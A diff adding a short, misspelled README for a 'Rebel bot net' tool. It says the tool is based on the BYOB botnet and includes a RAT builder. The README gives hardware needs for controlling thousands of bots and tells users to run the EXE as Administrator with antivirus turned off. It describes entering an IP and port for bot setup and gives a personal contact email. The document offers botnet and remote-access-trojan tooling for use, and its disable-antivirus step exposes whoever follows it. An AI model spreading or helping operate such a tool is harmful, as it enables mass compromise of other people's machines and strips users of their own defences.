@@ -1,0 +1,22 @@
+this is based on Byob Bot net with few fixes and other plug in's 
+
+you will need 
+
+IP. Port ( for the bot to set it self up )
+
+atlest a I5 and 4GB ram (why i5 due to havein over 2,000 bots ur CPu might bottle neck )
+
+GPU 2gb or more not really needed but will help with building and runing more smoothly 
+
+
+Click and run Botnet EXE run as Admin with AVG (etc) off as this has a rat builder as well and av's dont like them 
+
+wean asked for IP input ur IP and Port 
+
+click next then will be asked were u wish for the file to install 
+(for the builder and files for Cpancel )
+
+Easy as that for Windows 10 any Prob please Email me at rebelsparx@gmail.com with subject Net.exe if u need to add a photo i reckonment online past bin 
+
+
+thank you for downloading and trying the Rebel bot net 
